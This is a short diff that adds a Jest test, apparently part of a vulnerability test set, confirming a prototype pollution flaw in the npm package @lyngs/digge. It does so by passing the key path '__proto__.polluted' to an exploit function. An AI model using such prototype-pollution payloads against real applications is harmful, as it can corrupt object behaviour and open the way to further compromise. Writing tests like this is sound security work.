@@ -1,0 +1,9 @@
+test("Prototype pollution in @lyngs/digge", () => {
+    const { exploitFunction } = require("./function.js");
+    const { getPayload } = require('./payload.js');
+
+    const payload = getPayload();
+    let output = exploitFunction({}, "__proto__.polluted", "yes", { extend: true });
+
+    expect(output.polluted).toBe("yes");
+});
